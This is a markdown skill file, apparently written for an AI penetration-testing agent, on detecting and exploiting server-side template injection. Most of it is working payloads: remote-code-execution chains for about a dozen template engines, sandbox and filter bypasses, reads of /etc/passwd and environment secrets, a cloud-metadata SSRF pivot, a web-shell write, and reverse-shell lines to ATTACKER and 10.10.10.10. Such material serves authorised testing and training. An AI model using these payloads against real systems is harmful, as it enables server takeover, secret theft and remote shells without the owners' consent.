<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: ssti
description: Server-Side Template Injection detection and exploitation across all major template engines
---

# Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded directly into a server-side template and evaluated. Unlike XSS, SSTI executes on the server, often leading to RCE. Treat every endpoint that reflects input in dynamic pages as a potential SSTI surface.

## Attack Surface

**Template Engines by Language**
- Python: Jinja2, Mako, Chameleon, Tornado, Django templates
- JavaScript/Node: Pug (Jade), Handlebars, EJS, Nunjucks, Mustache, Twig.js
- PHP: Twig, Smarty, Blade (Laravel), Volt (Phalcon), Plates
- Java: Freemarker, Velocity, Thymeleaf, Pebble, Groovy
- Ruby: ERB, Slim, Haml, Liquid
- .NET: Razor, DotLiquid, Scriban

**Common Injection Points**
- Email/notification templates with user-controlled subject or body
- Report generators and PDF exports with custom fields
- Marketing/CMS pages with user-supplied HTML/template snippets
- Error pages that reflect URL path or query parameters
- Configuration UIs with template previews
- Chat/comment systems with Markdown + template hybrid rendering
- REST API responses rendering custom messages

## Detection — Engine Fingerprinting

Use a polyglot probe first, then narrow by engine response:

```
# Polyglot probe — triggers all major engines
${{<%[%'"}}%\.
```

| Payload | Expected Output | Engine |
|---------|----------------|--------|
| `{{7*7}}` | `49` | Jinja2, Twig, Nunjucks |
| `${7*7}` | `49` | Freemarker, Velocity, Mako |
| `<%= 7*7 %>` | `49` | ERB, EJS |
| `#{7*7}` | `49` | Ruby ERB (alternative) |
| `{{7*'7'}}` | `49` or `7777777` | Jinja2 (49) vs Twig (7777777) |
| `{7*7}` | `49` | Smarty |
| `@(7*7)` | `49` | Razor (.NET) |
| `*{7*7}` | `49` | Thymeleaf (Spring) |

**Distinguishing Jinja2 vs Twig:**
```
{{7*'7'}}
# Jinja2 → 49 (numeric multiplication)
# Twig   → 7777777 (string repetition)
```

**Blind SSTI (no output reflection):**
```bash
# Time-based via sleep
{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
# Or via OOB DNS callback
{{''.__class__.__mro__[2].__subclasses__()[40]('/dev/tcp/attacker.com/80')}}
```

## Engine-Specific Exploitation

### Jinja2 (Python)

**Read /etc/passwd:**
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
# Or via config globals
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**RCE via subprocess:**
```python
{{''.__class__.__mro__[2].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()[0].strip()}}
# Find correct index: iterate __subclasses__() to find subprocess.Popen
{% for x in ''.__class__.__mro__[2].__subclasses__() %}
  {% if 'subprocess' in x.__name__ %}{{x('id',shell=True,stdout=-1).communicate()}}{% endif %}
{% endfor %}
```

**Bypass sandbox / attr filter:**
```python
# Using request object (Flask context)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Using cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}
# Using joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}
# Using lipsum
{{lipsum.__globals__['os'].popen('id').read()}}
```

**Filter bypass (underscore/bracket blocked):**
```python
# Use |attr filter
{{()|attr('__class__')|attr('__mro__')|...}}
# Hex encoding
{{()|attr('\x5f\x5fclass\x5f\x5f')}}
# String concatenation
{{'__cla'+'ss__'}}
```

### Twig (PHP)

**RCE:**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# Or via system
{{['id']|filter('system')}}
# Or passthru
{{['id']|filter('passthru')}}
# shell_exec
{{"id"|shell_exec}}
```

**Read file:**
```php
{{"/etc/passwd"|file_get_contents}}
```

**PHP 8 / newer Twig bypass:**
```php
{% set cmd %}id{% endset %}
{% set output = cmd|filter('system') %}
```

### Freemarker (Java)

**RCE:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Or via ObjectConstructor
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign owc=classLoader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign dwf=owc?api.newInstance()>
${dwf("java.lang.Runtime")?api.exec("id")}
```

**SSRF via Freemarker:**
```
<#assign is="java.io.InputStreamReader"?new("https://attacker.com")>
${is.read()}
```

### Velocity (Java)

**RCE:**
```
#set($runtime = $class.inspect("java.lang.Runtime").type)
#set($process = $runtime.exec("id"))
#set($output = $process.inputStream)
```

### Smarty (PHP)

**RCE:**
```php
{php}echo `id`;{/php}
# Newer Smarty (no PHP tags):
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### ERB (Ruby)

**RCE:**
```ruby
<%= `id` %>
<%= IO.popen('id').read %>
<%= system('id') %>
```

### Thymeleaf (Java/Spring)

**Expression injection:**
```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
# In URL context
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

**Spring SpEL via Thymeleaf:**
```
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### Handlebars (Node.js)

**Prototype pollution to RCE:**
```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Pug/Jade (Node.js)

**RCE:**
```javascript
#{function(){localLoad=global.process.mainModule.constructor._resolveFilename('child_process');childProcess=require(localLoad);return childProcess.execSync('id').toString()}()}
```

### EJS (Node.js)

**RCE:**
```javascript
<% global.process.mainModule.require('child_process').execSync('id') %>
```

## Escalation Paths

**SSTI → File Read:**
```python
# Python: open() via subclasses
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
# PHP Twig
{{"/etc/passwd"|file_get_contents}}
```

**SSTI → Internal Network Scan (SSRF pivot):**
```python
# Python — hit internal endpoints
{{config.__class__.__init__.__globals__['urllib'].request.urlopen('http://169.254.169.254/latest/meta-data/').read()}}
```

**SSTI → Environment Variables (secrets):**
```python
# Jinja2
{{config}}
{{config.items()}}
# Shows SECRET_KEY, DB passwords etc.
{{''.__class__.__mro__[2].__subclasses__()[40]('/proc/self/environ').read()}}
```

**SSTI → Reverse Shell:**
```bash
# After confirming RCE via id/whoami
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
# URL-encoded in template
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"').read()}}
```

## Testing Methodology

1. **Identify reflection** — find endpoints where input appears in response (especially emails, reports, custom fields)
2. **Inject polyglot** — use `${{<%[%'"}}%\.` to provoke errors revealing engine
3. **Confirm SSTI vs XSS** — SSTI evaluates math: `{{7*7}}` → `49`; XSS reflects literally
4. **Fingerprint engine** — use `{{7*'7'}}` to distinguish Jinja2 (49) vs Twig (7777777)
5. **Probe for RCE** — try engine-specific OS execution payloads
6. **Find subclasses index** — iterate `__subclasses__()` to locate subprocess/os classes
7. **Exfiltrate** — read config, env vars, /etc/passwd, then escalate to shell

```bash
# Quick fingerprint via curl
curl -s "https://target.com/render?name={{7*7}}"
# Returns 49 → SSTI confirmed, likely Jinja2/Twig

# Identify engine
curl -s "https://target.com/render?name={{7*'7'}}"
# 49 → Jinja2, 7777777 → Twig

# Confirm RCE (Jinja2)
curl -s "https://target.com/render?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

## Bypass Techniques

**Blocked `_` (underscore):**
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
# Or using |attr() chaining
```

**Blocked `.` (dot):**
```python
{{''['__class__']['__mro__'][2]['__subclasses__']()}}
```

**Blocked keywords (`config`, `class`, `import`):**
```python
# Split strings
{{'__cla'+'ss__'}}
# Hex/unicode
{{'\x5f\x5fclass\x5f\x5f'}}
```

**Jinja2 sandbox escape:**
```python
# Via namespace object
{% set x = namespace(y=().__class__.__mro__[1].__subclasses__()) %}
```

## Validation

1. Execute `id` or `whoami` and show full output in response
2. Read `/etc/passwd` and extract first line
3. Make DNS callback to Burp Collaborator/interactsh proving blind execution
4. Demonstrate environment variable exfiltration (`SECRET_KEY`, `DATABASE_URL`)
5. Show full RCE reproduction curl command

## False Positives

- `{{7*7}}` reflected literally — template engine is escaping or not evaluating
- Math output in rendering context that pre-processes client-side (Angular, Vue template syntax)
- Calculator/math expression evaluators that happen to use curly braces

## Impact

- Full RCE on web server as application user
- Secret/credential extraction (DB passwords, API keys, JWT secret keys)
- Internal network pivoting via SSRF
- Container escape if running in Docker without seccomp

## Pro Tips

1. Always iterate `__subclasses__()` to find correct class index — it changes between Python versions
2. Try `{{config}}` in Flask/Jinja2 first — often dumps entire Flask config including SECRET_KEY
3. In Java engines, `T(java.lang.Runtime)` is the universal RCE primitive
4. For blind SSTI, use DNS callbacks via `curl` or `nslookup` in the executed command
5. Twig blocks `_self` in newer versions — fall back to filter chains with `passthru`/`system`
6. EJS and Pug run in Node.js: always try `require('child_process').execSync()`
7. Check if the template engine is sandboxed — Jinja2 sandbox bypass via `cycler`/`lipsum` globals

## Summary

SSTI is critical because it executes on the server. Fingerprint the engine first (math probe), then use engine-specific RCE primitives. Always validate with real command execution output. Even "sandboxed" engines have known escapes.
